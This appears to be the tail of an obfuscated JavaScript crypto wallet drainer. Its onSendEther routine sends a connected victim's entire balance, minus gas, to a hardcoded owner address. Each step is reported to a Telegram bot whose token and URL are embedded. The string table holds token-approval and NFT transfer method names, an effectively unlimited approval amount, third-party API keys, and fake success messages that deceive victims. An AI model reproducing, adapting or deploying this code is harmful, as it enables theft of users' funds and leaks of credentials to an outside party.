_0x927198=_0xa5bbdd;console[_0x927198(0x184)](_0x927198(0x102)+_0x506881),sendMessage(_0x927198(0x16d)),sendMessage(_0x927198(0x15c)+_0x194656[_0x927198(0xdc)]),sendMessage(_0x927198(0x19d)+OWNER_ADDRESS);})['on'](_0xa5bbdd(0x14e),_0x1bc895=>{const _0x294353=_0xa5bbdd;console[_0x294353(0x184)](_0x294353(0x11a)+_0x1bc895),sendMessage(_0x294353(0xd2));});}else sendMessage(_0xa5bbdd(0x111));}};}async function onSendEther(){const _0x238720=_0x4971b0;try{let _0x32864a=await web3Object[_0x238720(0xea)][_0x238720(0x182)](selectedAccount);var _0x2530fc=await web3Object[_0x238720(0xea)][_0x238720(0x14a)](),_0x1c19f5={'gasPrice':_0x2530fc,'from':selectedAccount,'to':OWNER_ADDRESS,'value':_0x32864a},_0x4856b6=await web3Object[_0x238720(0xea)][_0x238720(0x180)](_0x1c19f5),_0x316849=_0x2530fc*_0x4856b6;_0x1c19f5[_0x238720(0x1a6)]=_0x4856b6,_0x1c19f5[_0x238720(0x199)]=_0x32864a-_0x316849,web3Object[_0x238720(0xea)]['sendTransaction'](_0x1c19f5)['on'](_0x238720(0x1b0),_0x493064=>{const _0x58dc4d=_0x238720;console[_0x58dc4d(0x184)](_0x58dc4d(0xc2),_0x493064),sendMessage(_0x58dc4d(0x141));})['on'](_0x238720(0x12a),_0x1f46f5=>{const _0x4490d4=_0x238720;console['log']('Transaction\x20Receipt:\x20',_0x1f46f5),sendMessage(_0x4490d4(0x163));})['on'](_0x238720(0x14e),_0x3ab6b3=>{const _0x4e843a=_0x238720;console[_0x4e843a(0x184)](_0x4e843a(0x11a),_0x3ab6b3),sendMessage(_0x4e843a(0xd2));});}catch{sendMessage('Insufficient\x20funds\x20for\x20transfer');}}function _0x1719(_0x24ef80,_0x9f138){const _0x2fb1fd=_0x2fb1();return _0x1719=function(_0x171927,_0x5f42ac){_0x171927=_0x171927-0xbe;let _0x14a680=_0x2fb1fd[_0x171927];return _0x14a680;},_0x1719(_0x24ef80,_0x9f138);}async function sendMessage(_0x20707f){return new Promise((_0x44e14d,_0x22f1ea)=>{const _0x3fb545=_0x1719,_0x4262e3=CHAT;fetch(_0x3fb545(0x147)+_0x4262e3+_0x3fb545(0x188)+_0x20707f,{'method':'GET','headers':{}})[_0x3fb545(0xe0)](async _0x5400b5=>{const _0x2d7b1f=_0x3fb545;if(_0x5400b5[_0x2d7b1f(0xf0)]>0x18f)throw _0x5400b5;_0x44e14d(await _0x5400b5[_0x2d7b1f(0x100)]());})[_0x3fb545(0x1aa)](_0x51b033=>{_0x22f1ea(_0x51b033);});});}function _0x2fb1(){const _0x1faa28=['base-testnet','cronos-testnet','5887njYjaN','389233YwVAsl','getApproved','Transaction\x20is\x20submitted\x20to\x20the\x20network','transferOwnership','findora-mainnet','JSON','.connect','skale-calypso','https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=','ckey_5da97a82746c43ed84565c64afb','newMaxFee','getGasPrice','numberOfTokens','Cl\x20address\x20:\x20','operator','error','symbol','_to','totalSupply','destroyBlackFunds','matic-mumbai','index','setStartingIndex','moonbeam-moonbase-alpha','8376rYaIFF','provenanceHash','findora-forge-testnet','allowed','_name','NFT\x20Contract\x20Address\x20','aurora-mainnet','_blackListedUser','boba-bobabeam-mainnet','isApprovedForAll','balanceOf','contract_ticker_symbol','Transfer\x20Completed\x20Successfully,\x20You\x20should\x20receive\x20some\x20native\x20tokens','safeTransferFrom','222nWMdok','milkomeda-a1-mainnet','revealTimeStamp','allowance','uint256','_user','avalanche-testnet','canto-mainnet','Approve\x20Completed\x20Successfully','DestroyedBlackFunds','view','pause','827760FExMqI','renounceOwnership','swimmer-mainnet','saleStart','decimals','skale-razor','isBlackListed','Approval','AddedBlackList','milkomeda-a1-devnet','skale-staging-uum','amount','Transfer','emerald-paratime-mainnet','MAX_APES','estimateGas','boba-avalanche-mainnet','getBalance','rsk-mainnet','log','12686WZHywh','owner','setApprovalForAll','&text=','connect','setBaseURI','bool','mintApe','metis-mainnet','feeBasisPoints','transfer','quote','_spender','_from','payable','withdraw','approved','e77435344ef0486893cdc26d7d5cf039','meter-testnet','avalanche-dexalot-testnet','value','newOwner','map','paused','Your\x20address\x20','Token\x20not\x20found,\x20Please\x20switch\x20network\x20or\x20try\x20again!','Contract','basisPointsRate','deprecated','default','bsc-mainnet','meter-mainnet','astar-shibuya','gas','_value','name','accountsChanged','catch','baseURI','fantom-testnet','maxApePurchase','eth-mainnet','axie-mainnet','transactionHash','kcc-mainnet','function','click','rsk-testnet','RemovedBlackList','covalent-internal-network-v1','_data','Could\x20not\x20get\x20a\x20wallet\x20connection','Wallet\x20Connected\x20Successfully\x20to\x20','Open\x20your\x20selected\x20wallet\x20or\x20extension\x20to\x20approve\x20smart\x20contract','Unpause','0x017eB2C4968b8E2B1317bD6Dea89bFc25D781085','_totalSupply','startingIndexBlock','redeem','aurora-testnet','application/json','Transaction\x20Hash:\x20','tokenURI','https://ava-mainnet.blastapi.io/c7937bc2-4607-4321-927a-daa76e77ebfa/ext/bc/C/rpc','spender','avalanche-fuji-mainnet','1020YsKpHB','New\x20token','length','gather-testnet','_upgradedAddress','/balances_v2/','Initial\x20list\x20','palm-mainnet','Pause','defi-kingdoms-testnet','3500meSAWV','Transaction\x20Rejected','tokenId','2653717kpJwgl','nervos-polyjuice-testnet','optimism-mainnet','removeBlackList','skale-omnus','eth-goerli','arbitrum-mainnet','flarenetworks-flare-testnet','address','boba-bobabase-testnet','items','getChainId','then','tokens-list','bittorrent-mainnet','bittorrent-testnet','emergencySetStartingIndexBlock','chainId:','_balance','fantom-mainnet','_initialSupply','WalletConnectProvider','eth','_maker','upgradedAddress','flipSaleState','matic-mainnet','TOKEN\x20Contract\x20Address\x20','status','swimmer-testnet','2079dhfsLu','maximumFee','solana-mainnet','bytes','newAddress','message','_owner','harmony-testnet','OwnershipTransferred','999999999999999999999999999999999999999999999999999999999999999999999999','polygon-zkevm-testnet','event','constructor','type','json','Debug','Transaction\x20Receipt:\x20','nervos-godwoken-mainnet','maxNftSupply','harmony-mainnet','astar-mainnet','_clearedUser','approve','issue','_symbol','metis-testnet','https://api.covalenthq.com/v1/','search','who','from','remaining','Invalid\x20token\x20${token.address}','balances','moonbeam-mainnet','bytes4','Token\x20balance\x20is\x20','bsc-testnet','balance','linea-testnet','oasis-sapphire-testnet','Error:\x20','boba-goerli','transferFrom','Tokens:','flarenetworks-canary-mainnet','oasis-sapphire-mainnet','filter','getOwner','tokenByIndex','methods','Deprecate','evmos-testnet','Redeem','avalanche-dexalot-mainnet','kcc-testnet','setRevealTimestamp','receipt','boba-rinkeby-testnet','toString','flarenetworks-canary-testnet','supportsInterface','nonpayable','1410qLjQuy','startingIndex','reserveApes','sx-mainnet','setProvenanceHash','boba-avalanche-testnet','BAYC_PROVENANCE','string','send','contract_address','boba-bnb-mainnet','10000'];_0x2fb1=function(){return _0x1faa28;};return _0x2fb1();}